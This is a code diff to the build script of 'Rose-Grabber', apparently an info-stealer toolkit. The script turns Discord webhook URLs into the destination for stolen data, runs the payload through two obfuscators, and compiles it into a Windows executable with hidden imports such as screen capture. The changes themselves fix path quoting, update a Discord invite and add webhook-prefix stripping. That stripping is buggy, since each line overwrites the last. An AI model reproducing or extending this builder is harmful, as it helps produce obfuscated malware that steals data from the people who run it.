@@ -100,7 +100,7 @@ links = {
     "svn_github": "https://github.com/suvan1911",
     "smth_github": "https://github.com/smthpy",
     "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
-    "rose_discord": "https://discord.gg/GvRZxa4S3Y"
+    "rose_discord": "https://discord.gg/sMawrDqnta"
 }
 
 logger.critical(f"Rose UI Builder is using version {str(__version__)}")
@@ -150,6 +150,8 @@ def replace_discord_url(url):
     match = re.match(r"https:\/\/discordapp\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+", url)
     if match:
         new_url = match.group(0).replace('discordapp.com', 'discord.com')
+        new_url = match.group(0).replace('canary.', '')
+        new_url = match.group(0).replace('ptb.', '')
         return new_url
     else:
         return url
@@ -208,7 +210,7 @@ def _makebuild(q: Queue, data_builder) -> str:
     rosefub = os.path.join(path, 'obf2-rose.py')
     blankobf = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'blankobf.py')
     pycloak = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'pycloak-main')
-    rvenv = os.path.join(Path(__file__).resolve().parent.parent.parent, 'rosevenv', 'Scripts', 'activate')
+    rvenv = f"'{os.path.join(Path(__file__).resolve().parent.parent.parent, 'rosevenv', 'Scripts', 'activate')}'"
     final = 'dist\\Built.exe'
     post = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'comp', 'post.py')
         
@@ -284,13 +286,13 @@ def _makebuild(q: Queue, data_builder) -> str:
             logger.info("Entering obfuscate")
             try:
                 logger.info("Entering obfuscate process")
-                obf1 = f'call {rvenv} && python {blankobf} -o {rosefu} {rosef}'
+                obf1 = f'call {rvenv} && python "{blankobf}" -o "{rosefu}" "{rosef}"'
                 logger.info(obf1)
                 subprocess.call(obf1, shell=True, stderr=subprocess.STDOUT)
                 install = f'call {rvenv} && cd "{pycloak}" && pip install .'
                 logger.info(install)
                 subprocess.call(install, shell=True, stderr=subprocess.STDOUT)
-                obf2 = f'call {rvenv} && pycloak -o {rosefub} -d {rosefu}'
+                obf2 = f'call {rvenv} && pycloak -o "{rosefub}" -d "{rosefu}"'
                 logger.info(obf2)
                 subprocess.call(obf2, shell=True, stderr=subprocess.STDOUT)
                 os.remove(rosefu)
@@ -394,7 +396,8 @@ def _makebuild(q: Queue, data_builder) -> str:
             'time',
             'zlib.compress',
             'mss.mss',
-            'lzma'
+            'lzma',
+            'aiohttp',
         ]
         himports = [item for item in himports if item]
         
@@ -411,7 +414,7 @@ def _makebuild(q: Queue, data_builder) -> str:
                 stderr=subprocess.STDOUT
             )
             logger.info(f"Output of Python compile process saved in rosecompile.log")
-            subprocess.call(f'call {rvenv} && python {post} dist/Built.exe', shell=True, stderr=subprocess.STDOUT)
+            subprocess.call(f'call {rvenv} && python "{post}" dist/Built.exe', shell=True, stderr=subprocess.STDOUT)
         except Exception as e:
             logger.error(f"Error in py compile: {e}")
 
